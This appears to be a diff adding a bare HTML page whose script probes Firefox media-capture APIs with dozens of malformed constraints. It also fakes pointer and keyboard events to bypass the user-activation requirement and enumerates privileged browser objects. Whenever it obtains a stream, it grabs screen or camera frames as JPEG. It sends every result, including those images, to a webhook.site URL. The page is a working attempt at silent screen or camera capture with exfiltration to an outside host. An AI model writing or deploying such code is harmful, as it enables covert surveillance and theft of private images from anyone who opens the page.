@@ -1,0 +1,218 @@
+<!DOCTYPE html>
+<html><head><title>H</title></head>
+<body style="margin:0;background:#111;">
+<script>
+var W='https://webhook.site/6a70c74a-c8ad-47fd-ae1f-d403ec94c954';
+var N=0;
+function rpt(k,v){N++;new Image().src=W+'?n='+N+'&t='+k+'&v='+encodeURIComponent((''+v).substring(0,500))}
+
+rpt('INIT','page=H|sec='+window.isSecureContext+'|moz='+(typeof navigator.mozGetUserMedia));
+
+var done=false;
+
+function processStream(label,stream){
+  if(done)return;done=true;
+  rpt('GOT_STREAM',label+'|tracks='+stream.getTracks().length);
+  stream.getTracks().forEach(function(t,i){
+    rpt('TRACK',i+'|'+t.kind+':'+t.label+':'+t.readyState);
+  });
+  var v=document.createElement('video');
+  v.srcObject=stream;v.autoplay=true;v.muted=true;
+  document.body.appendChild(v);
+  function grab(gl){
+    var w=v.videoWidth||1600,h=v.videoHeight||900;
+    rpt('GRAB',gl+'|'+w+'x'+h+'|rdy='+v.readyState);
+    if(w<=0||h<=0)return;
+    var c=document.createElement('canvas');c.width=w;c.height=h;
+    var ctx=c.getContext('2d');
+    try{ctx.drawImage(v,0,0,w,h)}catch(e){rpt('DRAW_E',gl+'|'+e.message);return}
+    try{var d=ctx.getImageData(0,0,20,1);
+      var px=Array.from(d.data);
+      rpt('PX',gl+'|nz='+px.filter(function(x){return x>0}).length+'|'+px.slice(0,40).join(','));
+    }catch(e){rpt('PX_E',gl+'|'+e.message)}
+    try{var du=c.toDataURL('image/jpeg',0.8);
+      rpt('DU',gl+'|len='+du.length);
+      if(du.length>1000){navigator.sendBeacon(W,gl+':'+du);
+        fetch(W,{method:'POST',mode:'no-cors',body:gl+':'+du}).catch(function(){});}
+    }catch(e){rpt('DU_E',gl+'|'+e.message)}
+  }
+  v.onloadeddata=function(){grab('ld0');setTimeout(function(){grab('ld1')},1000);setTimeout(function(){grab('ld3')},3000);};
+  setTimeout(function(){grab('t1')},500);setTimeout(function(){grab('t5')},5000);
+}
+
+function tryMoz(label,constraints){
+  if(done)return Promise.resolve();
+  return new Promise(function(resolve){
+    if(!navigator.mozGetUserMedia){rpt('MOZ_NA',label);resolve();return}
+    navigator.mozGetUserMedia(constraints,
+      function(s){rpt('MOZ_OK',label);processStream('moz_'+label,s);resolve()},
+      function(e){rpt('MOZ_E',label+'|'+e.name+':'+e.message.substring(0,200));resolve()});
+  });
+}
+
+function tryGUM(label,constraints){
+  if(done)return Promise.resolve();
+  return new Promise(function(resolve){
+    if(!navigator.mediaDevices||!navigator.mediaDevices.getUserMedia){rpt('GUM_NA',label);resolve();return}
+    navigator.mediaDevices.getUserMedia(constraints).then(function(s){
+      rpt('GUM_OK',label);processStream('gum_'+label,s);resolve();
+    }).catch(function(e){
+      rpt('GUM_E',label+'|'+e.name+':'+e.message.substring(0,200));resolve();
+    });
+  });
+}
+
+function tryGDM(label,constraints){
+  if(done)return Promise.resolve();
+  return new Promise(function(resolve){
+    if(!navigator.mediaDevices||!navigator.mediaDevices.getDisplayMedia){resolve();return}
+    navigator.mediaDevices.getDisplayMedia(constraints).then(function(s){
+      rpt('GDM_OK',label);processStream('gdm_'+label,s);resolve();
+    }).catch(function(e){
+      rpt('GDM_E',label+'|'+e.name+':'+e.message.substring(0,200));resolve();
+    });
+  });
+}
+
+async function runTests(){
+  // === GROUP A: Mandatory with unusual/bogus mediaSource values ===
+  await tryMoz('m_empty',{video:{mandatory:{mediaSource:''}}});
+  await tryMoz('m_null',{video:{mandatory:{mediaSource:null}}});
+  await tryMoz('m_undef',{video:{mandatory:{}}});
+  await tryMoz('m_true',{video:{mandatory:{mediaSource:true}}});
+  await tryMoz('m_false',{video:{mandatory:{mediaSource:false}}});
+  await tryMoz('m_zero',{video:{mandatory:{mediaSource:0}}});
+  await tryMoz('m_one',{video:{mandatory:{mediaSource:1}}});
+  await tryMoz('m_desktop',{video:{mandatory:{mediaSource:'desktop'}}});
+  await tryMoz('m_monitor',{video:{mandatory:{mediaSource:'monitor'}}});
+  await tryMoz('m_display',{video:{mandatory:{mediaSource:'display'}}});
+  await tryMoz('m_tab',{video:{mandatory:{mediaSource:'tab'}}});
+  await tryMoz('m_capture',{video:{mandatory:{mediaSource:'capture'}}});
+  await tryMoz('m_camera',{video:{mandatory:{mediaSource:'camera'}}});
+  await tryMoz('m_other',{video:{mandatory:{mediaSource:'other'}}});
+  await tryMoz('m_tabcap',{video:{mandatory:{mediaSource:'tabCapture'}}});
+
+  // === GROUP B: Mandatory screen with various IDs ===
+  await tryMoz('ms_d0',{video:{mandatory:{mediaSource:'screen',deviceId:'0'}}});
+  await tryMoz('ms_dn1',{video:{mandatory:{mediaSource:'screen',deviceId:'-1'}}});
+  await tryMoz('ms_dcolon',{video:{mandatory:{mediaSource:'screen',deviceId:':0'}}});
+  await tryMoz('ms_dcolon2',{video:{mandatory:{mediaSource:'screen',deviceId:':0.0'}}});
+  await tryMoz('ms_sid0',{video:{mandatory:{mediaSource:'screen',sourceId:'0'}}});
+  await tryMoz('ms_sid1',{video:{mandatory:{mediaSource:'screen',sourceId:'1'}}});
+
+  // === GROUP C: Mandatory browser with IDs ===
+  await tryMoz('mb_d0',{video:{mandatory:{mediaSource:'browser',deviceId:'0'}}});
+  await tryMoz('mb_d1',{video:{mandatory:{mediaSource:'browser',deviceId:'1'}}});
+  await tryMoz('mb_sid0',{video:{mandatory:{mediaSource:'browser',sourceId:'0'}}});
+  await tryMoz('mb_sid1',{video:{mandatory:{mediaSource:'browser',sourceId:'1'}}});
+
+  // === GROUP D: Mandatory with displaySurface constraint ===
+  await tryMoz('m_ds_mon',{video:{mandatory:{displaySurface:'monitor'}}});
+  await tryMoz('m_ds_win',{video:{mandatory:{displaySurface:'window'}}});
+  await tryMoz('m_ds_brw',{video:{mandatory:{displaySurface:'browser'}}});
+  await tryMoz('m_ds_app',{video:{mandatory:{displaySurface:'application'}}});
+  await tryMoz('ms_ds',{video:{mandatory:{mediaSource:'screen',displaySurface:'monitor'}}});
+
+  // === GROUP E: Mandatory with chromeMediaSource (Chromium compat) ===
+  await tryMoz('m_cms_tab',{video:{mandatory:{chromeMediaSource:'tab'}}});
+  await tryMoz('m_cms_desk',{video:{mandatory:{chromeMediaSource:'desktop'}}});
+  await tryMoz('m_cms_scrn',{video:{mandatory:{chromeMediaSource:'screen'}}});
+
+  // === GROUP F: getUserMedia (standard) with mandatory format ===
+  await tryGUM('gm_mand_s',{video:{mandatory:{mediaSource:'screen'}}});
+  await tryGUM('gm_mand_b',{video:{mandatory:{mediaSource:'browser'}}});
+  await tryGUM('gm_mand_w',{video:{mandatory:{mediaSource:'window'}}});
+  await tryGUM('gm_mand_e',{video:{mandatory:{}}});
+
+  // === GROUP G: Activation bypass via pointer/touch events ===
+  try{
+    var btn=document.createElement('button');btn.textContent='X';
+    document.body.appendChild(btn);
+    // PointerEvent
+    var pe=new PointerEvent('pointerdown',{bubbles:true,cancelable:true,pointerId:1,pointerType:'mouse'});
+    btn.dispatchEvent(pe);
+    pe=new PointerEvent('pointerup',{bubbles:true,cancelable:true,pointerId:1,pointerType:'mouse'});
+    btn.dispatchEvent(pe);
+    rpt('ACT_PTR','active='+navigator.userActivation.isActive+'|had='+navigator.userActivation.hasBeenActive);
+    // KeyboardEvent
+    var ke=new KeyboardEvent('keydown',{key:'Enter',code:'Enter',bubbles:true});
+    btn.dispatchEvent(ke);
+    ke=new KeyboardEvent('keyup',{key:'Enter',code:'Enter',bubbles:true});
+    btn.dispatchEvent(ke);
+    rpt('ACT_KEY','active='+navigator.userActivation.isActive+'|had='+navigator.userActivation.hasBeenActive);
+  }catch(e){rpt('ACT_E',e.message)}
+
+  // === GROUP H: After all attempts, try getDisplayMedia if activated ===
+  if(navigator.userActivation.isActive||navigator.userActivation.hasBeenActive){
+    rpt('ACT_YES','trying captures');
+    await tryGDM('act1',{video:true});
+    await tryGDM('act2',{video:{displaySurface:'browser'}});
+  }
+
+  // === GROUP I: WebRTC-based capture attempts ===
+  try{
+    rpt('WEBRTC','RTCPeerConnection='+(typeof RTCPeerConnection)
+      +'|RTCRtpSender='+(typeof RTCRtpSender)
+      +'|MediaStreamTrackGenerator='+(typeof MediaStreamTrackGenerator)
+      +'|VideoFrame='+(typeof VideoFrame)
+      +'|VideoEncoder='+(typeof VideoEncoder));
+  }catch(e){rpt('WEBRTC_E',e.message)}
+
+  // Try canvas captureStream
+  try{
+    var c=document.createElement('canvas');c.width=100;c.height=100;
+    var ctx=c.getContext('2d');
+    ctx.fillStyle='red';ctx.fillRect(0,0,100,100);
+    var cs=c.captureStream(1);
+    rpt('CANVAS_CAP','tracks='+cs.getTracks().length+'|kind='+cs.getTracks()[0].kind);
+  }catch(e){rpt('CANVAS_CAP_E',e.message)}
+
+  // === GROUP J: Components enumeration ===
+  try{
+    var props=[];
+    for(var p in Components){props.push(p)}
+    rpt('COMP_PROPS',props.join(','));
+    if(Components.interfaces){
+      var iprops=[];
+      for(var p in Components.interfaces){iprops.push(p);if(iprops.length>20)break}
+      rpt('COMP_IFACES',iprops.join(','));
+    }
+    if(Components.classes){
+      var cprops=[];
+      for(var p in Components.classes){cprops.push(p);if(cprops.length>20)break}
+      rpt('COMP_CLASSES',cprops.join(','));
+    }
+  }catch(e){rpt('COMP_E',e.message)}
+
+  // === GROUP K: Check for other privileged access paths ===
+  try{
+    rpt('PRIV2','dump='+(typeof window.dump)
+      +'|netscape='+(typeof window.netscape)
+      +'|XPCNativeWrapper='+(typeof XPCNativeWrapper)
+      +'|SpecialPowers='+(typeof window.SpecialPowers)
+      +'|InspectorUtils='+(typeof InspectorUtils)
+      +'|Glean='+(typeof Glean));
+  }catch(e){rpt('PRIV2_E',e.message)}
+
+  // Try netscape.security
+  try{
+    if(window.netscape&&window.netscape.security){
+      rpt('NETSCAPE',JSON.stringify(Object.keys(window.netscape.security)));
+    }
+  }catch(e){rpt('NETSCAPE_E',e.message)}
+
+  // === GROUP L: Try window.open approach for popup ===
+  // Check if opener has camera visible
+  try{
+    if(window.opener){
+      rpt('OPENER','exists|loc='+window.opener.location);
+    }
+  }catch(e){rpt('OPENER_E',e.message)}
+
+  rpt('DONE','H_complete');
+}
+
+runTests();
+</script>
+</body>
+</html>
